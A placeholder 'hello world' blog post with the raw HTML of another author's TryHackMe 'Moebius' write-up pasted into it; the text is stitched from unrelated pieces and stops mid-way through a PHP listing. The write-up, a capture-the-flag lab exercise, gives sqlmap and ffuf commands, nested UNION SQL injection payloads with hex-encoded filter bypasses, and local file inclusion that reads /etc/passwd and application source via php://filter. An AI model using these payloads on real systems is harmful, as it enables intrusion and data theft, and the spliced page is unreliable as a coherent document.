---
title: "hello world"
date: 2025-04-05
categories: [hello world]
tags: [hello world]
author: Paschal
image:
   path: https://tryhackme-images.s3.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1738938756523
   alt: log
---


# hello world

this is my blog
 
 new projects to come

<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="TryHackMe: Moebius" /><meta name="author" content="jaxafed" /><meta property="og:locale" content="en" /><meta name="description" content="Moebius started by abusing a nested SQL injection vulnerability to achieve Local File Inclusion (LFI), which we then turned into code execution using PHP filters chain. We then bypassed disabled functions to achieve Remote Code Execution (RCE), allowing us to gain a shell inside a Docker container. By escaping the container through mounting the host’s file system, we captured the user flag. Lastly, we found the root flag inside the database and completed the room." /><meta property="og:description" content="Moebius started by abusing a nested SQL injection vulnerability to achieve Local File Inclusion (LFI), which we then turned into code execution using PHP filters chain. We then bypassed disabled functions to achieve Remote Code Execution (RCE), allowing us to gain a shell inside a Docker container. By escaping the container through mounting the host’s file system, we captured the user flag. Lastly, we found the root flag inside the database and completed the room." /><link rel="canonical" href="https://jaxafed.github.io/posts/tryhackme-moebius/" /><meta property="og:url" content="https://jaxafed.github.io/posts/tryhackme-moebius/" /><meta property="og:site_name" content="jaxafed" /><meta property="og:image" content="https://jaxafed.github.io/images/tryhackme_moebius/room_image.webp" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-04-28T00:00:00+03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://jaxafed.github.io/images/tryhackme_moebius/room_image.webp" /><meta property="twitter:title" content="TryHackMe: Moebius" /><meta name="twitter:site" content="@jaxafed" /><meta name="twitter:creator" content="@jaxafed" /><meta name="google-site-verification" content="f1ujY27xMTyDEYgpcRx1iCjHRPC7dWFhy09ZdChpF-Y" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"jaxafed","url":"https://jaxafed.github.io"},"dateModified":"2025-04-28T00:00:00+03:00","datePublished":"2025-04-28T00:00:00+03:00","description":"Moebius started by abusing a nested SQL injection vulnerability to achieve Local File Inclusion (LFI), which we then turned into code execution using PHP filters chain. We then bypassed disabled functions to achieve Remote Code Execution (RCE), allowing us to gain a shell inside a Docker container. By escaping the container through mounting the host’s file system, we captured the user flag. Lastly, we found the root flag inside the database and completed the room.","headline":"TryHackMe: Moebius","image":"https://jaxafed.github.io/images/tryhackme_moebius/room_image.webp","mainEntityOfPage":{"@type":"WebPage","@id":"https://jaxafed.github.io/posts/tryhackme-moebius/"},"url":"https://jaxafed.github.io/posts/tryhackme-moebius/"}</script><title>TryHackMe: Moebius | jaxafed</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="jaxafed"><meta name="application-name" content="jaxafed"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-7XENH7DP4S"></script> <script> document.addEventListener('DOMContentLoaded', () => { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-7XENH7DP4S'); }); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/pp.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">jaxafed</a><p class="site-subtitle fst-italic mb-0"></p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/jaxafed" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/jaxafed" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>TryHackMe: Moebius</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>TryHackMe: Moebius</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1745787600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 28, 2025 </time> </span><div class="mt-3 mb-3"> <a href="/images/tryhackme_moebius/room_image.webp" class="popup img-link preview-img shimmer"><img src="/images/tryhackme_moebius/room_image.webp" alt="Preview Image" width="1200" height="630" loading="lazy"></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://jaxafed.github.io">jaxafed</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="3298 words" > <em>18 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">TryHackMe: Moebius</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">TryHackMe: Moebius</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p><strong>Moebius</strong> started by abusing a <strong>nested SQL injection</strong> vulnerability to achieve <strong>Local File Inclusion (LFI)</strong>, which we then turned into <strong>code execution</strong> using <strong>PHP filters chain</strong>. We then bypassed disabled functions to achieve <strong>Remote Code Execution (RCE)</strong>, allowing us to gain a shell inside a Docker container. By escaping the container through mounting the host’s file system, we captured the user flag. Lastly, we found the root flag inside the database and completed the room.</p><p><a href="https://tryhackme.com/room/moebius" class="center" class="img-link shimmer" ><img src="/images/tryhackme_moebius/room_card.webp" alt="Tryhackme Room Link" width="300" height="300" loading="lazy"></a></p><h2 id="initial-enumeration"><span class="me-2">Initial Enumeration</span><a href="#initial-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="nmap-scan"><span class="me-2">Nmap Scan</span><a href="#nmap-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We start with an <strong><code class="language-plaintext highlighter-rouge">nmap</code></strong> scan:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$ nmap -T4 -n -sC -sV -Pn -p- 10.10.152.169
Nmap scan report for 10.10.152.169
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Image Grid
</pre></table></code></div></div><p>There are two ports open:</p><ul><li><strong>22</strong> (<code class="language-plaintext highlighter-rouge">SSH</code>)<li><strong>80</strong> (<code class="language-plaintext highlighter-rouge">HTTP</code>)</ul><h3 id="web-80"><span class="me-2">Web 80</span><a href="#web-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Visiting <code class="language-plaintext highlighter-rouge">http://10.10.152.169/</code>, we see a site for cat pictures with links to <code class="language-plaintext highlighter-rouge">/album.php</code>, with the <code class="language-plaintext highlighter-rouge">short_tag</code> variable set to <strong>cute</strong>, <strong>smart</strong>, or <strong>fav</strong>, depending on the album we choose.</p><p><a href="/images/tryhackme_moebius/web_80_index.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_index.webp" alt="Web 80 Index" width="1200" height="600" loading="lazy"></a></p><p>Checking <code class="language-plaintext highlighter-rouge">http://10.10.152.169/album.php</code>, we can see that images from the selected album are displayed on the page via requests to the <code class="language-plaintext highlighter-rouge">/image.php</code> endpoint with the <code class="language-plaintext highlighter-rouge">hash</code> and <code class="language-plaintext highlighter-rouge">path</code> variables.</p><p><a href="/images/tryhackme_moebius/web_80_album.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album.webp" alt="Web 80 Album" width="1200" height="600" loading="lazy"></a></p><p>Lastly, checking <code class="language-plaintext highlighter-rouge">http://10.10.152.169/image.php</code> with the variables set by <code class="language-plaintext highlighter-rouge">album.php</code>, we simply see the image being displayed.</p><p><a href="/images/tryhackme_moebius/web_80_image.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_image.webp" alt="Web 80 Image" width="1200" height="600" loading="lazy"></a></p><p>It seems that <code class="language-plaintext highlighter-rouge">image.php</code> includes the file passed with the <code class="language-plaintext highlighter-rouge">path</code> argument, but there is also the <code class="language-plaintext highlighter-rouge">hash</code> variable, probably calculated from the <code class="language-plaintext highlighter-rouge">path</code> to prevent the inclusion of arbitrary files, as modifying either of them results in an <strong>Image not found</strong> error.</p><p><a href="/images/tryhackme_moebius/web_80_image_error.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_image_error.webp" alt="Web 80 Image Error" width="1000" height="500" loading="lazy"></a></p><h2 id="foothold"><span class="me-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="sql-injection"><span class="me-2">SQL Injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>At this point, we can try to guess how the <code class="language-plaintext highlighter-rouge">hash</code> variable is calculated for the given <code class="language-plaintext highlighter-rouge">path</code> to be able to include any file we want, but this does not seem very viable as there are too many possible ways it could be calculated, and there is a high chance the calculation includes a secret unknown to us.</p><p>Instead, going back to <code class="language-plaintext highlighter-rouge">album.php</code> and testing the <code class="language-plaintext highlighter-rouge">short_tag</code> variable for <strong>SQL injection</strong> with the <code class="language-plaintext highlighter-rouge">smart'</code> payload, we can see that it is vulnerable to <strong>SQL injection</strong>, as we get an error from the database.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli.webp" alt="Web 80 Album Sqli" width="1200" height="600" loading="lazy"></a></p><p>Trying a basic payload such as <code class="language-plaintext highlighter-rouge">smart' AND 1=1;-- -</code> with the request <code class="language-plaintext highlighter-rouge">http://10.10.152.169/album.php?short_tag=smart' AND 1=1;-- -</code>, we get an interesting error: <strong>Hacking attempt</strong>. It seems there are some filters in place.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli2.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli2.webp" alt="Web 80 Album Sqli Two" width="900" height="300" loading="lazy"></a></p><p>Through the process of elimination, we can see that if our payload includes the <code class="language-plaintext highlighter-rouge">;</code> character, we get the <strong>Hacking attempt</strong> message.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli3.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli3.webp" alt="Web 80 Album Sqli Three" width="900" height="300" loading="lazy"></a></p><p>We can use <code class="language-plaintext highlighter-rouge">ffuf</code> to fuzz for every special character and discover that, along with the <code class="language-plaintext highlighter-rouge">;</code> character, the <code class="language-plaintext highlighter-rouge">/</code> character is also being filtered. Neither of them is a problem, as we can simply omit <code class="language-plaintext highlighter-rouge">;</code> and there is no need for <code class="language-plaintext highlighter-rouge">/</code>.</p><div class="language-console wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ffuf <span class="nt">-u</span> <span class="s1">'http://10.10.152.169/album.php?short_tag=FUZZ'</span> <span class="nt">-w</span> /usr/share/seclists/Fuzzing/special-chars.txt <span class="nt">-mr</span> <span class="s1">'Hacking attempt'</span>
<span class="c">...
</span><span class="gp">;</span><span class="w">                       </span><span class="o">[</span>Status: 200, Size: 268, Words: 18, Lines: 11, Duration: 131ms]
<span class="go">/                       [Status: 200, Size: 268, Words: 18, Lines: 11, Duration: 441ms]
</span></pre></table></code></div></div><p>Instead of enumerating the database manually, we can simply run <strong>sqlmap</strong> against it and discover that there are two databases: <code class="language-plaintext highlighter-rouge">information_schema</code> and <code class="language-plaintext highlighter-rouge">web</code>.</p><div class="language-console wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.152.169/album.php?short_tag=smart'</span> <span class="nt">-p</span> short_tag <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--threads</span> 10 <span class="nt">--batch</span> <span class="nt">--dbs</span>
<span class="c">...
</span><span class="go">available databases [2]:
[*] information_schema
[*] web
</span></pre></table></code></div></div><p>Dumping the <code class="language-plaintext highlighter-rouge">web</code> database, there are two tables in it: <code class="language-plaintext highlighter-rouge">images</code> and <code class="language-plaintext highlighter-rouge">albums</code>, with nothing seemingly important.</p><div class="language-console wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.152.169/album.php?short_tag=smart'</span> <span class="nt">-p</span> short_tag <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--threads</span> 10 <span class="nt">--batch</span> <span class="nt">-D</span> web <span class="nt">--hex</span> <span class="nt">--dump</span>
<span class="go">
Database: web
Table: images
[16 entries]
+----+----------+----------------------------+
| id | album_id | path                       |
+----+----------+----------------------------+
| 1  | 1        | /var/www/images/cat1.jpg   |
| 2  | 1        | /var/www/images/cat2.jpg   |
| 3  | 1        | /var/www/images/cat3.jpg   |
</span><span class="c">...
</span><span class="go">| 16 | 3        | /var/www/images/cat16.webp |
+----+----------+----------------------------+
</span><span class="c">...
</span><span class="go">Database: web
Table: albums
[3 entries]
+----+----------------+-----------+--------------------------+
| id | name           | short_tag | description              |
+----+----------------+-----------+--------------------------+
| 1  | Cute cats      | cute      | Cutest cats in the world |
| 2  | Smart cats     | smart     | So smart...              |
| 3  | Favourite cats | fav       | My favourite ones        |
+----+----------------+-----------+--------------------------+
</span></pre></table></code></div></div><p>Since we also have access to the <code class="language-plaintext highlighter-rouge">information_schema</code> database, we can run <strong>sqlmap</strong> with the <code class="language-plaintext highlighter-rouge">--statement</code> flag to fetch the current <strong>SQL</strong> statement we are injecting into.</p><div class="language-console wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.152.169/album.php?short_tag=smart'</span> <span class="nt">-p</span> short_tag <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--batch</span> <span class="nt">-D</span> web <span class="nt">--statement</span> <span class="nt">--hex</span>
<span class="go">
SQL statements [1]:
[*] SELECT id from albums where short_tag = 'smart' AND (SELECT 2144 FROM(SELECT COUNT(*),CONCAT(0x717a6b7671,(SELECT MID((HEX(IFNULL(CAST(INFO AS NCHAR),0x20))),301,16) FROM INFORMATION_SCHEMA.PROCESSLIST),0x71786b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IVDO'
</span></pre></table></code></div></div><p>Looking at the statement <code class="language-plaintext highlighter-rouge">SELECT id from albums where short_tag = 'smart'</code>, we can see that the application simply fetches the <code class="language-plaintext highlighter-rouge">id</code> for the album the user selected using the <code class="language-plaintext highlighter-rouge">short_tag</code>.</p><h3 id="nested-sql-injection"><span class="me-2">Nested SQL Injection</span><a href="#nested-sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>At this point, we didn’t get much out of the database, but we learned a couple of things to make some assumptions.</p><p>First of all, we know that the query we inject into, <strong><code class="language-plaintext highlighter-rouge">SELECT id from albums where short_tag = '&lt;short_tag&gt;'</code></strong>, simply fetches the album <code class="language-plaintext highlighter-rouge">id</code> from the <code class="language-plaintext highlighter-rouge">albums</code> table. However, if we look at the output of <strong>album.php</strong> with a valid <code class="language-plaintext highlighter-rouge">short_tag</code>, we can see that the page also displays the <code class="language-plaintext highlighter-rouge">paths</code> for the images, which are stored in the <code class="language-plaintext highlighter-rouge">images</code> table.</p><p><a href="/images/tryhackme_moebius/web_80_album_source.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_source.webp" alt="Web 80 Album Source" width="1200" height="600" loading="lazy"></a></p><p>So, it is most likely that after the application fetches the album <code class="language-plaintext highlighter-rouge">id</code> with the <strong><code class="language-plaintext highlighter-rouge">SELECT id from albums where short_tag = '&lt;short_tag&gt;'</code></strong> query, it runs another query like <strong><code class="language-plaintext highlighter-rouge">SELECT * from images where album_id = &lt;album_id&gt;</code></strong>, with the <code class="language-plaintext highlighter-rouge">album_id</code> being the result of the previous query, and there is a chance that the <code class="language-plaintext highlighter-rouge">album_id</code> in this second query (which comes directly as the result of the first query) is not sanitized, just like the <code class="language-plaintext highlighter-rouge">short_tag</code> in the previous query, once again allowing <strong>SQL injection</strong>.</p><p>Secondly, looking at the database, we don’t see the hashes for the images, so it is also probable that after fetching the paths for the images with the second query, <strong>album.php</strong> calculates the hashes programmatically. This means that if we can inject into this second query and make it return what we want as the <code class="language-plaintext highlighter-rouge">path</code>, we can force <strong>album.php</strong> to calculate the <code class="language-plaintext highlighter-rouge">hash</code> for that path and use it at <strong>/image.php</strong> to include any file we want.</p><p>We don’t know if the application exactly works this way, but we can simply test it. First, using a payload like <code class="language-plaintext highlighter-rouge">jxf' UNION SELECT 0-- -</code> on the <code class="language-plaintext highlighter-rouge">short_tag</code> variable for <strong>album.php</strong> with the request <code class="language-plaintext highlighter-rouge">http://10.10.152.169/album.php?short_tag=jxf' UNION SELECT 0-- -</code>, we can see that we are able to control the <code class="language-plaintext highlighter-rouge">album_id</code> returned by the query.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli4.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli4.webp" alt="Web 80 Album Sqli Four" width="800" height="300" loading="lazy"></a></p><p>Now, instead of an <code class="language-plaintext highlighter-rouge">id</code>, with a payload like <code class="language-plaintext highlighter-rouge">jxf' UNION SELECT "0 OR 1=1-- -"-- -</code>, we can make the first query return <strong><code class="language-plaintext highlighter-rouge">0 OR 1=1-- -</code></strong> as the album <code class="language-plaintext highlighter-rouge">id</code>, and if our theory is right, the second query would be something like <strong><code class="language-plaintext highlighter-rouge">SELECT * from images where album_id=0 OR 1=1-- -</code></strong>, which would cause all the images to be displayed. Testing this, we can see that it works exactly as we hoped.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli5.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli5.webp" alt="Web 80 Album Sqli Five" width="1200" height="600" loading="lazy"></a></p><p>Next, trying a <strong>UNION</strong>-based payload to control the <code class="language-plaintext highlighter-rouge">path</code> returned by the second query, we are successful with three columns using the payload <code class="language-plaintext highlighter-rouge">jxf' UNION SELECT "0 UNION SELECT 1,2,3-- -"-- -</code>, and we can see that the third column is the <code class="language-plaintext highlighter-rouge">path</code>.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli6.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli6.webp" alt="Web 80 Album Sqli Six" width="1000" height="400" loading="lazy"></a></p><p>Now, trying to set the <code class="language-plaintext highlighter-rouge">path</code> as <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to force <strong>album.php</strong> to calculate the hash for this path and use it at <strong>/image.php</strong> to read it, with the payload <code class="language-plaintext highlighter-rouge">jxf' UNION SELECT "0 UNION SELECT 1,2,'/etc/passwd'-- -"-- -</code>, we once again encounter the <strong>Hacking attempt</strong> error, as <code class="language-plaintext highlighter-rouge">/</code> is a filtered character.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli7.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli7.webp" alt="Web 80 Album Sqli Seven" width="1000" height="300" loading="lazy"></a></p><p>However, this is not really a problem, as we can simply <strong>hex encode</strong> the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to bypass the filter with the payload: <code class="language-plaintext highlighter-rouge">jxf' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764-- -"-- -</code>. We can see that this works, and we get the calculated hash for <code class="language-plaintext highlighter-rouge">/etc/passwd</code> as <code class="language-plaintext highlighter-rouge">9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d</code>.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli8.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli8.webp" alt="Web 80 Album Sqli Eight" width="1100" height="400" loading="lazy"></a></p><p>Now visiting <code class="language-plaintext highlighter-rouge">http://10.10.152.169/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&amp;path=/etc/passwd</code>, we can see that we were successfully able to include the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file and read its contents.</p><p><a href="/images/tryhackme_moebius/web_80_image_include.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_image_include.webp" alt="Web 80 Image Include" width="1100" height="400" loading="lazy"></a></p><h3 id="reading-application-files"><span class="me-2">Reading Application Files</span><a href="#reading-application-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>At this point, since we are able to include arbitrary files, we could attempt log poisoning to escalate the LFI into RCE. However, we are unable to find a suitable log file to poison.</p><p>Instead, we can use a PHP wrapper like <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=</code> to read and enumerate application files.</p><p>First, we convert <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=album.php</code> to hexadecimal (<code class="language-plaintext highlighter-rouge">7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870</code>) and craft the following payload:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>jxf' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870-- -"-- -
</pre></table></code></div></div><p>This forces the application to calculate the hash for the path <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=album.php</code>.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli9.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli9.webp" alt="Web 80 Album Sqli Nine" width="1200" height="450" loading="lazy"></a></p><p>With the calculated hash, we are able to read the source code of <code class="language-plaintext highlighter-rouge">album.php</code> as such:</p><div class="language-bash wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://10.10.152.169/image.php?hash=ec6e518b7e39db98affbf2bf2c671d469639503d4fee97bf7cf0f0a1319075d9&amp;path=php://filter/convert.base64-encode/resource=album.php'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
</pre></table></code></div></div><p>Output:</p><div class="language-php wrap highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>...
<span class="cp">&lt;?php</span>

<span class="k">include</span><span class="p">(</span><span class="s1">'dbconfig.php'</span><span class="p">);</span>

<span class="k">try</span> <span class="p">{</span>
